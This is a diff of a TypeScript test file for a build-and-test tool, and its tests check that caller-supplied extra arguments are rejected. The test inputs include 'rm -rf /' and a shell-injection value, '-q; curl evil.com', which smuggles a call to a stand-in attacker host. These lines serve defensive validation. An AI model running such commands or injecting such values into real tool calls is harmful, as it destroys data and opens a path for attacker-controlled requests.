@@ -33,18 +33,18 @@ describe("runProjectTestTool.execute", () => {
     }
   });
 
-  test("rejects a dangerous extraArg", async () => {
+  test("rejects caller-supplied extraArgs (removed — no extension bypass)", async () => {
     const ctx = makeContext(FIXTURE).ctx;
     const result = await runProjectTestTool.execute({ buildSystem: "maven", extraArgs: ["rm -rf /"] }, ctx);
     expect(result.ok).toBe(false);
-    if (!result.ok) expect(result.error.category).toBe("PERMISSION_DENIED");
+    if (!result.ok) expect(result.error.category).toBe("INVALID_INPUT");
   });
 
-  test("rejects shell metacharacter injection in extraArg", async () => {
+  test("rejects caller-supplied extraArgs with shell metacharacters", async () => {
     const ctx = makeContext(FIXTURE).ctx;
     const result = await runProjectTestTool.execute({ buildSystem: "maven", extraArgs: ["-q; curl evil.com"] }, ctx);
     expect(result.ok).toBe(false);
-    if (!result.ok) expect(result.error.category).toBe("PERMISSION_DENIED");
+    if (!result.ok) expect(result.error.category).toBe("INVALID_INPUT");
   });
 
   test("rejects unsupported build system via schema", async () => {
